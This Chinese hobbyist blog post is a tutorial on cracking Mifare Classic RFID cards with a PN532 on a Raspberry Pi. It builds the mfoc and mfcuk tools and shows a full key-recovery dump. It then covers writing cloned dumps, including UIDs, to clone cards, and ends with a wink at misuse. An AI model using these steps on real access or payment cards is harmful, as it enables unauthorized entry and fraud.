---
layout: single
title: 低成本安全硬件（二）——RFID on PN532
date: 2017-02-24 21:41:41
categories: "Hack"
tags:
- Hardware Security
- Wireless Security
- RFID
- Raspberry Pi
header:
  teaser: /assets/images/rfid-on-rpi/pn532.jpg
---

# 引言
鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。

# 背景
早在2007年，Mifare M1 RFID卡片就被研究人员破解了出来。NXP公司在M1卡上使用了未公开的加密算法，然而密码学史上的种种教训都表明了“不公开”与“安全的”并没有什么联系。研究人员剖析了卡片的门电路结构从而逆向了加密的算法并发现了漏洞。M1卡的结构如图所示，其拥有16个扇区，每个扇区有4个块，每个扇区的第一块储存着扇区的密钥
![RFID扇区结构](/assets/images/rfid-on-rpi/mifare_memory_layout_thumb.png)

目前针对Mifare卡片的攻击主要有三种方法：

## Nested攻击

简单地说，就是默认密码攻击。

由于M1卡片有16个扇区，在绝大多数情况下16个扇区不一定会同时使用到。于是根据厂商在出厂时预设的密码可能碰撞出其中某一个扇区的密码。

由于无源的M1卡每一次刷卡上电的时候，密钥交换采用的随机数都是“有规律”的，用已经碰撞出的某一扇区的密钥去试探其它扇区，在此时根据随机数的规律即可“套”出密码

## Darkside攻击

简单地说就是暴力破解，即爆破出某一个扇区的密钥，之后再使用Nested攻击就能Dump出整张卡。

而与通常意义上的暴力破解不同的是，由于M1卡片的认证机制，其会泄露部分认证信息，从而大大加快爆破的进度。

## 电波嗅探

顾名思义，即在正常刷卡的时候嗅探卡片与读卡器交换的数据，从而逆向密码。

这里可以参考2014年BlackHat的PDF：
<https://www.blackhat.com/docs/sp-14/materials/arsenal/sp-14-Almeida-Hacking-MIFARE-Classic-Cards-Slides.pdf>

以及相关论文：
<http://www.cs.ru.nl/~flaviog/publications/Attack.MIFARE.pdf>

# 常见硬件介绍
不同于之前BadUSB，在这方面可供我们选择的并不多。

## 旗舰级All-in-one的Proxmark3
![proxmark3](/assets/images/rfid-on-rpi/proxmark3.jpg)

国外的开源硬件，由FPGA驱动。性能十分强大，集嗅探、读取、克隆于一体，玩得了高频卡艹得动低频卡。可以插电脑可以接电源。当然其价格也是十分的感人。不过某宝上近期出现了400多元的V2版本，也不知道是如何做到将价格放到那么低的————国外的V1版本也要300多，只不过人家的是美刀。

伪装性：★★

易用性：★★★★

社区支持：★★★★

### 项目主页
<http://www.proxmark.org>

## 国外最近出现的ChameleonMini
![ChameleonMini](/assets/images/rfid-on-rpi/ChameleonMini.jpg)

如果不是因为要写此文特意去搜集了许多相关资料我还真不知道这玩意。这是德国的一个众筹项目，其和PM3差不多，拥有伪装卡的功能，从外形上看厚度与真正的卡片差不多，但是价格在国外比PM3要友好许多。

伪装性：★★★★

易用性：★★★

社区支持：★★★

### 项目主页
<https://github.com/emsec/ChameleonMini/wiki>


## 最流行的读卡器ACR122
![acr122](/assets/images/rfid-on-rpi/acr122.jpg)

反正就是很流行，大抵是因为网络上流传了非常强大的GUI改卡读卡复制卡软件吧！某宝价格一百多，但还是比我们今天所用到的硬件高出了那么三四倍。

伪装性：★

易用性：★★★★

社区支持：★★

# PN532
![笔者的PN532](/assets/images/rfid-on-rpi/pn532.jpg)

根据上篇的经验，之前介绍的那坨东西肯定是不会用到的———因为穷啊！

本篇的主角是PN532，我将其与树莓派连接使用。当然没有树莓派也没关系（买一个就完了），也可以使用UART转USB的接口连接电脑使用。接下来的篇幅将从树莓派的构建开始详细讲解其玩法。

# 系统搭建

以主机为windows系统为例，linux自行解决。

## 系统准备
- 去<https://www.raspberrypi.org/>上下载最新的Raspbian Jessie 系统，笔者下载时的发布日是2017-02-16。
- 使用win32diskimager将解压后的img镜像文件烧写到sd卡上
- 注意新版本的Raspbian是默认不开启ssh的，所以我们需要在boot分区下创建一个名为ssh（<font color=red>小写！！！！</font>）的文件
- ssh进去，用户名pi，密码raspberry

## 系统配置

执行sudo raspi-config进行配置.

选择5-Interface Options，启用SPI、I2C，禁用Serial
选择7-Advanced Options，1-Expand Filesystem 扩展分区

## 安装依赖
依赖：
- autoconf
- libusb-dev
- libtool
- libpcsclite-dev
'''shell
sudo apt-get update
sudo apt-get upgrade
sudo apt-get install autoconf libusb-dev libtool libpcsclite-dev
```

# 工具安装
部分参考：<https://firefart.at/post/how-to-crack-mifare-classic-cards/>

## 树莓派与PN532连接
![RPi3的GPIO引脚图](/assets/images/rfid-on-rpi/rpi_interface.png)
笔者用的是树莓派3，但是GPIO口的区别不大，与PN532的连接方式为：
04 <-> VCC
06 <-> GND
08 <-> RXD
10 <-> TXD

![RPi3与PN532连接图](/assets/images/rfid-on-rpi/rpi_pn532.jpg)

## libnfc
顾名思义，nfc库。

官方github:<https://github.com/nfc-tools/libnfc>

```shell
wget https://github.com/nfc-tools/libnfc/releases/download/libnfc-1.7.1/libnfc-1.7.1.tar.bz2
tar -jxvf libnfc-1.7.1.tar.bz2
cd libnfc-1.7.1
autoreconf -vis
./configure --with-drivers=all --sysconfdir=/etc --prefix=/usr
make
sudo make install
sudo mkdir /etc/nfc
sudo mkdir /etc/nfc/devices.d
```

由于我们使用UART接口直接和PN532在树莓派上连接，还需要
```shell
sudo cp contrib/libnfc/pn532_uart_on_rpi.conf.sample /etc/nfc/devices.d/pn532_uart_on_rpi.conf
```

此时在不放卡与放卡的时候分别执行nfc-list，输出如下：
![RPi3的GPIO引脚图](/assets/images/rfid-on-rpi/nfc_list.png)

## mfoc
 mfoc即上述nested攻击的实现。

官方github：<https://github.com/nfc-tools/mfoc>

```shell
git clone https://github.com/nfc-tools/mfoc.git
cd mfoc/
autoreconf -vis
./configure
make
sudo make install
```

mfoc用法如下：
```shell
Usage: mfoc [-h] [-k key] [-f file] ... [-P probnum] [-T tolerance] [-O output]

  h     print this help and exit
  k     try the specified key in addition to the default keys
  //指定key
  f     parses a file of keys to add in addition to the default keys
  //用文件为输入指定多个key
  P     number of probes per sector, instead of default of 20
  //每个扇区测试密钥数目
  T     nonce tolerance half-range, instead of default of 20
        (i.e., 40 for the total range, in both directions)
  O     file in which the card contents will be written (REQUIRED)
  //输出dump的文件
  D     file in which partial card info will be written in case PRNG is not vulnerable

Example: mfoc -O mycard.mfd
Example: mfoc -k ffffeeeedddd -O mycard.mfd
Example: mfoc -f keys.txt -O mycard.mfd
Example: mfoc -P 50 -T 30 -O mycard.mfd

This is mfoc version 0.10.7.
For more information, run: 'man mfoc'.
```


简单地执行mfoc -O out.mfd，会dump出当前的卡片信息：
```shell
mfoc -O out.mfd
Found Mifare Classic 1k tag
ISO/IEC 14443A (106 kbps) target:
    ATQA (SENS_RES): 00  04  
* UID size: single
* bit frame anticollision supported
       UID (NFCID1): 10  bc  79  ce  
      SAK (SEL_RES): 08  
* Not compliant with ISO/IEC 14443-4
* Not compliant with ISO/IEC 18092

Fingerprinting based on MIFARE type Identification Procedure:
* MIFARE Classic 1K
* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1
* SmartMX with MIFARE 1K emulation
Other possible matches based on ATQA & SAK values:

Try to authenticate to all sectors with default keys...
Symbols: '.' no key found, '/' A key found, '\' B key found, 'x' both keys found
[Key: ffffffffffff] -> [.xxxxxxxxxxxxxxx]
[Key: a0a1a2a3a4a5] -> [.xxxxxxxxxxxxxxx]
[Key: d3f7d3f7d3f7] -> [.xxxxxxxxxxxxxxx]
[Key: 000000000000] -> [.xxxxxxxxxxxxxxx]
[Key: b0b1b2b3b4b5] -> [.xxxxxxxxxxxxxxx]
[Key: 4d3a99c351dd] -> [.xxxxxxxxxxxxxxx]
[Key: 1a982c7e459a] -> [.xxxxxxxxxxxxxxx]
[Key: aabbccddeeff] -> [.xxxxxxxxxxxxxxx]
[Key: 714c5c886e97] -> [.xxxxxxxxxxxxxxx]
[Key: 587ee5f9350f] -> [.xxxxxxxxxxxxxxx]
[Key: a0478cc39091] -> [.xxxxxxxxxxxxxxx]
[Key: 533cb6c723f6] -> [.xxxxxxxxxxxxxxx]
[Key: 8fd0a4f256e9] -> [.xxxxxxxxxxxxxxx]

Sector 00 - Unknown Key A               Unknown Key B
Sector 01 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 02 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 03 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 04 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 05 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 06 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 07 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 08 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 09 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 10 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 11 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 12 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 13 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 14 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff
Sector 15 - Found   Key A: ffffffffffff Found   Key B: ffffffffffff


Using sector 01 as an exploit sector
Sector: 0, type A, probe 0, distance 12851 .....
Sector: 0, type A, probe 1, distance 12845 .....
Sector: 0, type A, probe 2, distance 12847 .....
Sector: 0, type A, probe 3, distance 12851 .....
Sector: 0, type A, probe 4, distance 12849 .....
  Found Key: A [11dc95b2bd87]
  Data read with Key A revealed Key B: [11dc95b2bd87] - checking Auth: OK
Auth with all sectors succeeded, dumping keys to a file!
Block 63, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 62, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 61, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 60, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 59, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 58, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 57, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 56, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 55, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 54, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 53, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 52, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 51, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 50, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 49, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 48, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 47, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 46, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 45, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 44, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 43, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 42, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 41, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 40, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 39, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 38, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 37, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 36, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 35, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 34, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 33, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 32, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 31, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 30, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 29, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 28, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 27, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 26, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 25, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 24, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 23, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 22, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 21, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 20, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 19, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 18, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 17, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 16, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 15, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 14, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 13, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 12, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 11, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 10, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 09, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 08, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 07, type A, key ffffffffffff :00  00  00  00  00  00  ff  07  80  69  ff  ff  ff  ff  ff  ff  
Block 06, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 05, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 04, type A, key ffffffffffff :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 03, type A, key 11dc95b2bd87 :00  00  00  00  00  00  ff  07  80  69  11  dc  95  b2  bd  87  
Block 02, type A, key 11dc95b2bd87 :00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  00  
Block 01, type A, key 11dc95b2bd87 :5e  dc  bf  dd  4b  fd  cf  ff  87  d4  00  00  00  00  00  00  
Block 00, type A, key 11dc95b2bd87 :10  bc  79  ce  1b  08  04  00  62  63  64  65  66  67  68  69  
```


## mfcuk
官方github:<https://github.com/nfc-tools/mfcuk>

mfcuk(<font color=red>不是mfuck！！！</font>)即上述darkside攻击的实现。

```shell
git clone https://github.com/nfc-tools/mfcuk.git
cd mfcuk
autoreconf -vis
./configure
make
sudo make install
```

用法如下：
>
>mfcuk - 0.3.8
>Mifare Classic DarkSide Key Recovery Tool - 0.3
>by Andrei Costin, zveriu@gmail.com, http://andreicostin.com
>
>Usage:
>-C - require explicit connection to the reader. Without this option, the connection is not made and recovery will not occur
>-i mifare.dmp - load input mifare_classic_tag type dump
>-I mifare_ext.dmp - load input extended dump specific to this tool, has several more fields on top of mifare_classic_tag type dump
>-o mifare.dmp - output the resulting mifare_classic_tag dump to a given file
>-O mifare_ext.dmp - output the resulting extended dump to a given file
>-V sector[:A/B/any_other_alphanum[:fullkey]] - verify key for specified sector, -1 means all sectors
>	After first semicolon key-type can specified: A verifies only keyA, B verifies only keyB, anything else verifies both keys
	After second semicolon full 12 hex-digits key can specified - this key will override any loaded dump key for the given sector(s) and key-type(s)
>-R sector[:A/B/any_other_alphanum] - recover key for sector, -1 means all sectors.
>	After first semicolon key-type can specified: A recovers only keyA, B recovers only keyB, anything else recovers both keys
>-U UID - force specific UID. If a dump was loaded with -i, -U will overwrite the in the memory where dump was loaded
>-M tagtype - force specific tagtype. 8 is 1K, 24 is 4K, 32 is DESFire
>-D - for sectors and key-types marked for verification, in first place use default keys to verify (maybe you are lucky)
>-d key - specifies additional full 12 hex-digits default key to be checked. Multiple -d options can be used for more additional keys
>-s - milliseconds to sleep for SLEEP_AT_FIELD_OFF (Default: 10 ms)
>-S - milliseconds to sleep for SLEEP_AFTER_FIELD_ON (Default: 50 ms)
>-P hex_literals_separated - try to recover the key from a conversation sniffed with Proxmark3 (mifarecrack.c based). Accepts several options:
>	Concatenated string in hex literal format of form uid:tag_chal:nr_enc:reader_resp:tag_resp
>	Example -P 0x5c72325e:0x50829cd6:0xb8671f76:0xe00eefc9:0x4888964f would find key FFFFFFFFFFFF
>-p proxmark3_full.log - tries to parse the log file on it's own (mifarecrack.py based), get the values for option -P and invoke it
>-F - tries to fingerprint the input dump (-i) against known cards' data format
>-v verbose_level - verbose level (default is O)
>
>Usage examples:
>  Recove all keys from all sectors:
>    mfcuk -C -R -1
>  Recove the sector #0 key with 250 ms for all delays (delays could give more results):
>    mfcuk -C -R 0 -s 250 -S 250

鉴于篇幅关系，这里不详细介绍了

## 写卡
直接使用nfc-mfclassic即可对Mifare classic系列卡片写入。主要有M1卡（S50）和4K卡（S70）。

用法如下：

>nfc-mfclassic
>Usage: nfc-mfclassic f|r|R|w|W a|b <dump.mfd> [<keys.mfd> [f]]
>  f|r|R|w|W     - Perform format (f) or read from (r) or unlocked read from (R) or write to (w) or unlocked write to (W) card
>                  *** format will reset all keys to FFFFFFFFFFFF and all data to 00 and all ACLs to default
>                  *** unlocked read does not require authentication and will reveal A and B keys
>                  *** note that unlocked write will attempt to overwrite block 0 including UID
>                  *** unlocking only works with special Mifare 1K cards (Chinese clones)
>  a|A|b|B       - Use A or B keys for action; Halt on errors (a|b) or tolerate errors (A|B)
>  <dump.mfd>    - MiFare Dump (MFD) used to write (card to MFD) or (MFD to card)
>  <keys.mfd>    - MiFare Dump (MFD) that contain the keys (optional)
>  f             - Force using the keyfile even if UID does not match (optional)
>Examples:
>
>  Read card to file, using key A:
>
>    nfc-mfclassic r a mycard.mfd
>
>  Write file to blank card, using key A:
>
>    nfc-mfclassic w a mycard.mfd
>
>  Write new data and/or keys to previously written card, using key A:
>
>    nfc-mfclassic w a newdata.mfd mycard.mfd
>
>  Format/wipe card (note two passes required to ensure writes for all ACL cases):
>
>    nfc-mfclassic f A dummy.mfd keyfile.mfd f
>    nfc-mfclassic f B dummy.mfd keyfile.mfd f
>

这里要额外说明的是，M1卡的UID区域是只读不可写的，然而一些商家不符合规范（中国的牛B商家）吧0扇区的UID弄成了可写的，用W可以强行写入。

A|B代表用密钥A或者B写入（均可），这里牵扯到Mifare协议的东西，读者可以自行查阅相关资料。

# 结语
本文所含内容具有一定攻击性，切勿用于非法用途！弄出什么新闻也别找我负责！

## 关于PN532
由于查到PN532是支持Ultralight卡片的，但是笔者的PN532始终无法读取该类卡片，于是到elechouse的Github Issue中询问了关于PN532的问题————他们表面他们自己生产的PN532可以读几乎符合NFC协议的一切卡片，但是万恶的某宝在山寨的时候似乎阉割了一些功能，但是笔者测试1k和4k卡片都是可用的。

## 在手机上的奇技淫巧
在带有NFC功能的Android手机上有一款名为Mifare Classic Tools的软件，可以进行读写卡，dump的操作————但是必须用对密钥哦！可以在树莓派上破解之后把密钥添加进去，然后就能用手机进行读写卡了。至于用途，你懂的。
GGPLY链接：<https://play.google.com/store/apps/details?id=de.syss.MifareClassicTool&hl=zh>自备梯子
